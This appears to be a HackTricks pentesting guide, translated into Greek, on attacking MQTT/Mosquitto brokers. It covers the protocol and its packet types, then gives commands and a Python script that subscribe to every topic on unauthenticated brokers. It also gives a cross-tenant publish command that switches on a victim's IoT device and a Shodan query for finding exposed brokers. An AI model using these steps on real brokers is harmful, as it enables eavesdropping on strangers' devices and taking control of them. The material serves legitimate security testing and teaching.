# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

**MQ Telemetry Transport (MQTT)** είναι γνωστό ως ένα **πρωτόκολλο publish/subscribe για ανταλλαγή μηνυμάτων** που ξεχωρίζει για την εξαιρετική απλότητα και ελαφριά φύση του. Αυτό το πρωτόκολλο έχει σχεδιαστεί ειδικά για περιβάλλοντα όπου οι συσκευές έχουν περιορισμένες δυνατότητες και λειτουργούν σε δίκτυα με χαμηλό bandwidth, υψηλή καθυστέρηση ή μη αξιόπιστες συνδέσεις. Οι κύριοι στόχοι του MQTT περιλαμβάνουν τη μείωση της χρήσης του δικτύου και τη μείωση των απαιτήσεων στους πόρους της συσκευής. Επιπλέον, στοχεύει στη διατήρηση αξιόπιστης επικοινωνίας και στην παροχή ενός επιπέδου διασφάλισης παράδοσης. Αυτοί οι στόχοι καθιστούν το MQTT εξαιρετικά κατάλληλο για τον αναπτυσσόμενο τομέα της **machine-to-machine (M2M) communication** και του **Internet of Things (IoT)**, όπου είναι απαραίτητο να συνδεθούν αποτελεσματικά πολλαπλές συσκευές. Επιπλέον, το MQTT είναι ιδιαίτερα ωφέλιμο για εφαρμογές για κινητά, όπου η εξοικονόμηση bandwidth και ενέργειας μπαταρίας είναι κρίσιμη.

**Προεπιλεγμένη θύρα:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Επιθεώρηση της κυκλοφορίας

Όταν ένα πακέτο **CONNECT** λαμβάνεται από MQTT brokers, αποστέλλεται πίσω ένα πακέτο **CONNACK**. Το πακέτο αυτό περιέχει έναν return code που είναι κρίσιμος για την κατανόηση της κατάστασης της σύνδεσης. Ένας return code **0x00** σημαίνει ότι τα credentials έχουν γίνει αποδεκτά, υποδεικνύοντας επιτυχή σύνδεση. Αντίθετα, ένας return code **0x05** σηματοδοτεί ότι τα credentials είναι μη έγκυρα, εμποδίζοντας έτσι τη σύνδεση.

Για παράδειγμα, αν ο broker απορρίψει τη σύνδεση λόγω invalid credentials, το σενάριο θα μοιάζει κάπως έτσι:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** και ακόμη και αν γίνεται authentication, **encryption is not used by default** (τα credentials αποστέλλονται σε clear text). Επιθέσεις MITM μπορούν ακόμα να εκτελεστούν για να κλέψουν passwords.

Για να συνδεθείτε σε μια MQTT υπηρεσία μπορείτε να χρησιμοποιήσετε: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) και να εγγραφείτε σε όλα τα topics κάνοντας:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Μπορείτε επίσης να χρησιμοποιήσετε [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Μπορείτε επίσης να χρησιμοποιήσετε:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Ή μπορείτε να **εκτελέσετε αυτόν τον κώδικα για να προσπαθήσετε να συνδεθείτε σε μια υπηρεσία MQTT χωρίς authentication, να εγγραφείτε σε όλα τα θέματα και να ακούσετε τα μηνύματα**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Το μοτίβο Publish/Subscribe <a href="#b667" id="b667"></a>

Το μοντέλο publish/subscribe αποτελείται από:

- **Publisher**: δημοσιεύει ένα μήνυμα σε ένα (ή πολλά) topic(s) στον broker.
- **Subscriber**: εγγράφεται σε ένα (ή πολλά) topic(s) στον broker και λαμβάνει όλα τα μηνύματα που στέλνονται από τον publisher.
- **Broker**: δρομολογεί όλα τα μηνύματα από τους publishers προς τους subscribers.
- **Topic**: αποτελείται από ένα ή περισσότερα επίπεδα που χωρίζονται με κάθετο (/), π.χ., /smartshouse/livingroom/temperature.

### Packet Format <a href="#f15a" id="f15a"></a>

Κάθε MQTT πακέτο περιέχει μια σταθερή επικεφαλίδα (Σχήμα 02). Σχήμα 02: Σταθερή Επικεφαλίδα

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): Ξεκινάει από τον client για να ζητήσει σύνδεση με τον server.
- CONNACK (2): Η επιβεβαίωση από τον server για επιτυχή σύνδεση.
- PUBLISH (3): Χρησιμοποιείται για αποστολή μηνύματος από τον client στον server ή αντίστροφα.
- PUBACK (4): Επιβεβαίωση ενός PUBLISH πακέτου.
- PUBREC (5): Μέρος πρωτοκόλλου παράδοσης μηνύματος που διασφαλίζει ότι το μήνυμα έχει ληφθεί.
- PUBREL (6): Περαιτέρω διαβεβαίωση στην παράδοση μηνύματος, υποδεικνύοντας release του μηνύματος.
- PUBCOMP (7): Τελικό μέρος του πρωτοκόλλου παράδοσης μηνύματος, υποδεικνύοντας ολοκλήρωση.
- SUBSCRIBE (8): Αίτημα από client για εγγραφή σε ένα topic.
- SUBACK (9): Η επιβεβαίωση του server για αίτημα SUBSCRIBE.
- UNSUBSCRIBE (10): Αίτημα από client για διακοπή λήψης μηνυμάτων από ένα topic.
- UNSUBACK (11): Η απάντηση του server σε αίτημα UNSUBSCRIBE.
- PINGREQ (12): Μήνυμα heartbeat που στέλνεται από τον client.
- PINGRESP (13): Απάντηση του server στο heartbeat μήνυμα.
- DISCONNECT (14): Ξεκινάει από τον client για τερματισμό της σύνδεσης.
- Δύο τιμές, 0 και 15, είναι επισημασμένες ως reserved και η χρήση τους απαγορεύεται.

## Επιθέσεις στο οικοσύστημα IoT MQTT: plaintext brokers και παράκαμψη ACL θεμάτων

Πολλές καταναλωτικές IoT πλατφόρμες εκθέτουν MQTT brokers που χρησιμοποιούνται από δύο διακριτούς ρόλους:
- Συσκευές gateway/hub που γεφυρώνουν ραδιοπρωτόκολλα (π.χ., BLE/LoRa/Zigbee) προς το cloud.
- Mobile apps ή web backends που ελέγχουν συσκευές μέσω “app” topics.

Κοινές αδυναμίες που μπορείτε να εκμεταλλευτείτε κατά τη διάρκεια ενός pentest:

- MQTT σε απλό κείμενο σε μη-τυπικές θύρες (π.χ., TCP/8001) αντί για MQTTS. Ο οποιοσδήποτε παρατηρητής στο μονοπάτι μπορεί να διαβάσει διαπιστευτήρια και control frames. Χρησιμοποιήστε Wireshark για να εντοπίσετε cleartext CONNECT/CONNACK και SUBSCRIBE/PUBLISH κίνηση σε ασυνήθιστες θύρες.
- Αδύναμα ή ανύπαρκτα per-tenant topic ACLs. Αν τα topics ονοματίζονται μόνο με βάση το deviceId (π.χ., "/tenantless/<deviceId>/tx"), οποιοσδήποτε authenticated χρήστης μπορεί να PUBLISH σε συσκευές άλλων tenants.
- Διαρροή ευαίσθητων δεδομένων μέσω maintenance/admin topics (π.χ., Wi‑Fi credentials που εκπέμπονται σε απλό κείμενο μετά από αλλαγές config).

Examples (replace placeholders with real values):

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Δια-tenant έλεγχος όταν τα ACLs είναι αδύναμα (δημοσίευση στο device topic άλλου tenant):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- Το MQTT σε απλό κείμενο (plaintext) σε μη τυπικές θύρες είναι συχνό στο IoT. Σκεφτείτε να αναζητήσετε brokers σε εναλλακτικές θύρες και να επιβεβαιώσετε με ανίχνευση πρωτοκόλλου.

## Αναφορές

- [Πώς μια έξυπνη συσκευή των $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
